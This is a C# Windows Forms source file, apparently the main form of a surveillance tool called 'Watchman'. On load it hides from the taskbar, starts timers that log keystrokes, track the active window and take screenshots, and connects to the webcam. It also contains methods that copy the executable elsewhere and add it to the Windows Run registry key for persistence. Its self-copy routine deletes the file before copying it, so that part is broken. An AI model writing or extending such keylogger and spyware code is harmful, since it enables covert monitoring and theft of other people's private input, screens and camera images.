using System;
using System.Diagnostics;
using System.IO;
using System.Windows.Forms;
using Microsoft.Win32;

namespace Watchman
{
    public partial class Form1 : Form
    {

        private Camera _cam;
        private KLog _keylog;

        public Form1()
        {
            InitializeComponent();
        }
        

        private void Form1_Load(object sender, EventArgs e)
        {
            //this.Hide();
            //this.Opacity = 0;
            ShowInTaskbar = false;
            
            timer1.Enabled = true; 
            timer2.Enabled = true;
            timer3.Enabled = true;
            timer4.Enabled = true;

            _keylog = new KLog();
            _cam = new Camera();
            _cam.Connect(pictureBox1, _cam.Devices[0]);
        }

        private void CopyApplication(string location)
        {
            String fileName = String.Concat(Process.GetCurrentProcess().ProcessName, ".exe");
            String filePath = Path.Combine(Environment.CurrentDirectory, fileName);
            if (File.Exists(filePath)) File.Delete(filePath);
            File.Copy(filePath, location);
        }

        private void AddToStartUp()
        {
            RegistryKey rkApp = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            if (rkApp != null && rkApp.GetValue("WatchMan") == null)
                rkApp.SetValue("WatchMan", Application.ExecutablePath);
        }

        #region Time Tickers
        private void timer1_Tick(object sender, EventArgs e)
        {
            _keylog.Log();
        }

        private void timer2_Tick(object sender, EventArgs e)
        {
            _keylog.ActiveWindow();
        }

        private void timer3_Tick(object sender, EventArgs e)
        {
            _keylog.WriteLog();
            _keylog.TakeScreen();
        }
        #endregion

        #region Click events

        private void button1_Click(object sender, EventArgs e)
        {
            _cam.Record();
        }

        private void button2_Click(object sender, EventArgs e)
        {
            _cam.StopRecord();
        }

        #endregion
    }
}
